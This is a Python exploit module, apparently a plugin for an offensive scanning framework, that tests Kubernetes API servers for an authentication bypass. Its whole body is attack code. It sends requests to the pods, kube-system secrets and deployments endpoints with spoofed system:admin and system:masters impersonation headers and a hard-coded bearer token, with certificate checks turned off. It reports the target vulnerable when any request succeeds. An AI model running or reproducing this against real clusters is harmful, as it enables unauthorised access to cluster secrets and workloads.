import requests
from core.printmodels import *
import json

class Kubernetes_APIServer_Bypass:
    def __init__(self):
        self.name = "Kubernetes API Server Bypass"
        self.description = "Kubernetes API Server Authentication Bypass (2024)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'Authorization': 'Bearer DrDataYE',
                'X-Remote-User': 'system:admin',
                'X-Remote-Group': 'system:masters'
            }

            # Multiple attack vectors
            endpoints = [
                f"{site}/api/v1/namespaces/default/pods",
                f"{site}/api/v1/namespaces/kube-system/secrets",
                f"{site}/apis/apps/v1/namespaces/default/deployments"
            ]

            for endpoint in endpoints:
                response = requests.get(endpoint, headers=headers, verify=False, timeout=10)
                if response.status_code == 200 and ('items' in response.text or 'metadata' in response.text):
                    return PrintSuccess(f"[K8s-2024] Vulnerable! Authentication bypass successful at {endpoint}")

            return PrintFailed("[K8s-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[K8s-2024] Error: {str(e)}")
